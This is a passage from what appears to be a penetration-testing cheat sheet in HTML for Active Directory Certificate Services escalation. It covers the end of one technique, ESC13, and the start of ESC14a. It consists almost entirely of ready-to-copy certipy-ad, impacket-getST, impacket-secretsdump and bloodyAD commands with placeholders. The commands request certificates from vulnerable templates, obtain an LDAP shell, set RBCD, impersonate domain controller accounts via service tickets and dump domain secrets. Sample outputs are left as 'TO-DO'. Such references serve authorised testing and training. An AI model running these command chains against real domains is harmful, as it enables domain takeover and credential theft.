TO-DO</div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn '<span class="o editable-keyword">&lt;TARGET_USER_UPN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="4-get-ldap-shell">4. Get LDAP Shell</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad auth -pfx '<span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>.pfx' -dc-ip '<span class="o editable-keyword">&lt;DC_IP&gt;</span>' -ldap-shell
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="5-set-rbcd">5. Set RBCD</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set_rbcd <span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>$ <span class="o editable-keyword">&lt;USER&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="6-get-a-service-ticket">6. Get a Service Ticket</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">impacket-getST '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>:<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -spn 'ldap/<span class="o editable-keyword">&lt;DC&gt;</span>' -impersonate <span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">impacket-getST '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes ':<span class="o editable-keyword">&lt;HASH&gt;</span>' -spn 'ldap/<span class="o editable-keyword">&lt;DC&gt;</span>' -impersonate <span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">impacket-getST '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>:<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -spn 'ldap/<span class="o editable-keyword">&lt;DC&gt;</span>' -impersonate <span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">impacket-getST '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes ':<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -spn 'ldap/<span class="o editable-keyword">&lt;DC&gt;</span>' -impersonate <span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">impacket-getST '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>' -k -spn 'ldap/<span class="o editable-keyword">&lt;DC&gt;</span>' -impersonate <span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="7-secrets-dump">7. Secrets Dump</h4>
<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Pass-the-ticket
</span></span><span class="line"><span class="cl"><span class="go">export KRB5CCNAME='<span class="o editable-keyword">&lt;CCACHE&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">impacket-secretsdump -k -no-pass <span class="o editable-keyword">&lt;DC&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div></div></div><p></p>
<hr>
<h3 id="esc13-issuance-policy-with-privileged-group-linked">ESC13: Issuance Policy with Privileged Group Linked</h3>
<p class="tabs">
<button data-tabset="set14" data-tabcontent="tab1" class="active">Linux</button>

</p><div class="tabset-wrapper" data-tabset-group="set14"><div class="tabcontent active" data-tabset="set14" data-tabcontent="tab1"><h4 id="1-request-a-cert-of-user">1. Request a Cert of User</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template <span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="2-get-ntlm-hash">2. Get NTLM Hash</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad auth -pfx '<span class="o editable-keyword">&lt;USER&gt;</span>.pfx' -dc-ip '<span class="o editable-keyword">&lt;DC_IP&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div></div></div><p></p>
<hr>
<h3 id="esc14a-weak-explicit-certificate-mapping-altsecurityidentities">ESC14a: Weak Explicit Certificate Mapping (altSecurityIdentities)</h3>
<p class="tabs">
<button data-tabset="set15" data-tabcontent="tab1" class="active">Linux</button>

</p><div class="tabset-wrapper" data-tabset-group="set15"><div class="tabcontent active" data-tabset="set15" data-tabcontent="tab1"><h4 id="1-create-a-computer">1. Create a Computer</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> --host <span class="o editable-keyword">&lt;DC&gt;</span> add computer '<span class="o editable-keyword">&lt;NEW_COMPUTER&gt;</span>' '<span class="o editable-keyword">&lt;NEW_PASSWORD&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
